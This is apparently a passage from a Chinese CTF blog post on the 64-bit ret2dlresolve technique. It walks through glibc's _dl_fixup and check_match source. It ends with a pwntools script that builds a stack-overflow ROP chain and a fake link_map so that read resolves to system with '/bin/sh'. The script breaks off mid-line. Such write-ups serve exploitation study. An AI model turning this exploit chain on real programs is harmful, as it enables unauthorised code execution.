class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uintptr_t</span> pltgot = (<span class="keyword">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">      + reloc_offset (pltgot, reloc_arg));</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先则是关于<code>_dl_fixup</code>函数的重新分析，通过字符串进行查找对应函数时我们需要进入到底这条if语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>而最终真正找到函数地址的函数其实是<code>_dl_lookup_symbol_x</code>函数。然而其中存在一条调用关系是<code>do_lookup_x</code>=&gt;<code>check_match</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *</span></span><br><span class="line"><span class="function"><span class="title">check_match</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> undef_name,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> ref,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct r_found_version *<span class="keyword">const</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> type_class,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> Elf_Symndx symidx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct link_map *<span class="keyword">const</span> <span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) **<span class="keyword">const</span> versioned_sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">int</span> *<span class="keyword">const</span> num_versions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">  assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line"> &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line"> &amp;&amp; stt != STT_TLS)</span><br><span class="line">|| elf_machine_sym_no_match (sym)</span><br><span class="line">|| (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">     STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">     code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span> (strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">    <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *verstab </span>= <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">  <span class="keyword">if</span> (version != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  assert (version-&gt;filename == <span class="literal">NULL</span></span><br><span class="line">  || ! _dl_name_match_p (version-&gt;filename, <span class="built_in">map</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Otherwise we accept the symbol.  */</span></span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">     default one if it is not hidden.  */</span></span><br><span class="line">  ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">       || <span class="built_in">strcmp</span> (<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span class="line">      &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">  || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">    <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (verstab != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x7fff</span>)</span><br><span class="line">      &gt;= ((flags &amp; DL_LOOKUP_RETURN_NEWEST) ? <span class="number">2</span> : <span class="number">3</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Don&#x27;t accept hidden symbols.  */</span></span><br><span class="line">      <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x8000</span>) == <span class="number">0</span></span><br><span class="line">  &amp;&amp; (*num_versions)++ == <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* No version so far.  */</span></span><br><span class="line">*versioned_sym = sym;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">  <span class="keyword">return</span> sym;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>check_match</code>函数中通过这条<code>if (version != NULL)</code>语句又分为了两条分支，肉眼可见的是上面的分支是较为严格的一条，而下面的则是较为简单的一条。不过显而易见的是这条分支的走向是由<code>version</code>变量决定的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>version</code>的由来就是上面的这段代码赋予的，所以如果我们可以控制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>或者可以控制<code>ndx</code>都是可以解决的。</p><p>首先思考第二种方式，首先则是可以看到这里<code>ndx</code>中的计算方式<code>ELFW(R_SYM) (reloc-&gt;r_info)</code>和前面获取<code>sym</code>时是同一种运算方式。所以这一算式中的各个参数我们是优先保证sym的正确性的。不过<code>DT_SYMTAB</code>所处的段和<code>DT_VERSYM</code>所处的段是不一样的，这也是我们能够修改这里的依据之一，另一个依据则是<code>&amp;l-&gt;l_versions[0]</code>的内容是NULL。所以我们只需要让他为NULL即可。</p><p><code>DT_VERSYM</code>节的位置其实就是<code>.gnu.version</code>节的位置，所以首先通过<code>readelf</code>查看一下节的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Version symbols section <span class="string">&#x27;.gnu.version&#x27;</span> contains 7 entries:</span><br><span class="line">Addr: 0x00000000004003dc  Offset: 0x0003dc  Link: 5 (.dynsym)</span><br><span class="line">000:   0 (*<span class="built_in">local</span>*)       0 (*<span class="built_in">local</span>*)       2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br><span class="line">004:   3 (GLIBC_2.7)     2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br></pre></td></tr></table></figure><p>随后看一下程序在运行时的内存布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">        0x400000           0x401000 r-xp     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x600000           0x601000 r--p     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x601000           0x602000 rw-p     1000 1000   /ctf/work/download/todo/ezzzz</span><br></pre></td></tr></table></figure><p>可以看到<code>DT_VERSYM</code>所处的位置就是第一页中。</p><p>而在linux存在这样一种分页机制，如果当前页的使用不到<code>0x1000</code>其实也会返回一页，所以在没有使用完的情况下，页内可能存在空白数据也就是<code>\x00</code>。而这个段的结束位置则在<code>.eh_frame</code>可以看到地址为<code>0000000000400860</code>，那么当这个结束地址减去<code>.gnu.version</code>的地址则表示所取的<code>ndx</code>的偏移到<code>0x400860 ~ 0x401000</code>之间到最小值。</p><p>在x64和x32上<code>ElfW(Half)</code>的结构都是2个字节。所以上述的最小偏移是：<code>(0x400860-0x4003dc) / sizeof(ElfW(Half)) = 0x242</code></p><p>而我们需要把伪造的内容放到bss段上，随后计算最大偏移则是根据sym的获取进行计算<code>(0x602000-0x601000) /sizeof (Elf64_Sym) = 0xaa</code>。最终得到<code>0xaa &lt; 0x242</code>所以也就导致无法在满足ndx的同时拿到伪造的sym结构。**(不过32位是可以的，只需要在bss靠后的位置写sym结构体即可)**。</p><p>那么接着思考第一种方式，在只有栈溢出的情况下我们无法直接泄漏或修改<code>link_map</code>结构体中的内容，那么唯一可行的方法就是进行栈迁移在bss中伪造<code>link_map</code>，但是如果是走第一个分支就会出现一种情况了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lookup_t</span></span><br><span class="line">_dl_lookup_symbol_x (<span class="keyword">const</span> <span class="keyword">char</span> *undef_name, struct link_map *undef_map,</span><br><span class="line">     <span class="keyword">const</span> ElfW(Sym) **ref,</span><br><span class="line">     struct r_scope_elem *symbol_scope[],</span><br><span class="line">     <span class="keyword">const</span> struct r_found_version *version,</span><br><span class="line">     <span class="keyword">int</span> type_class, <span class="keyword">int</span> flags, struct link_map *skip_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> new_hash = _dl_new_hash (undef_name);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> old_hash = <span class="number">0xffffffff</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sym_val</span> <span class="title">current_value</span> =</span> &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">scope</span> =</span> symbol_scope;</span><br><span class="line"></span><br><span class="line">  bump_num_relocations ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned</span></span><br><span class="line"><span class="comment">     lookups.  */</span></span><br><span class="line">  assert (version == <span class="literal">NULL</span> || !(flags &amp; DL_LOOKUP_RETURN_NEWEST));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (skip_map != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">    <span class="keyword">while</span> ((*scope)-&gt;r_list[i] != skip_map)</span><br><span class="line">      ++i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> start = i; *scope != <span class="literal">NULL</span>; start = <span class="number">0</span>, ++scope)</span><br><span class="line">    <span class="keyword">if</span> (do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,</span><br><span class="line">     &amp;current_value, *scope, start, version, flags,</span><br><span class="line">     skip_map, type_class, undef_map) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>_dl_lookup_symbol_x</code>函数中搜索的方法是根据<code>scope</code>这个范围搜索的，而这个范围是通过<code>l-&gt;l_scope</code>获取的，所以如果我们在没有任何地址泄漏的情况下要想伪造<code>l_scope</code>是不现实的。那么唯一的方法是什么呢？</p><p>当然是走else语句了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br></pre></td></tr></table></figure><p>这里直接返回的是<code>link_map-&gt;l_addr + sym-&gt;d_val</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005c1</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x4003f6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rsi_r15)+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(read_plt)+p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">dynstr_addr = <span class="number">0x400318</span> <span class="comment"># str table</span></span><br><span class="line">fake_link_map_addr = bss+<span class="number">0x100</span></span><br><span class="line">r_offset = fake_link_map_addr + l_addr * -<span class="number">1</span> - <span class="number">8</span></span><br><span class="line">l_addr = l_addr &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)</span><br><span class="line">fake_strtab = p64(<span class="number">0</span>)+p64(dynstr_addr)</span><br><span class="line">fake_strtab_addr = fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">fake_symtab = p64(<span class="number">0</span>)+p64(read_got-<span class="number">0x8</span>)</span><br><span class="line">fake_symtab_addr = fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">fake_dynrel_addr = fake_link_map_addr+<span class="number">0x28</span></span><br><span class="line">fake_rel_addr = fake_link_map_addr+<span class="number">0x38</span></span><br><span class="line">fake_dynrel = p64(<span class="number">0</span>)+p64(fake_rel_addr)</span><br><span class="line">fake_rel = p64(r_offset)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_rel</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_dynrel_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">r.sendline(fake_link_map)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = fake_link_map_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(read_load_plt) + \</span><br><span class="line">    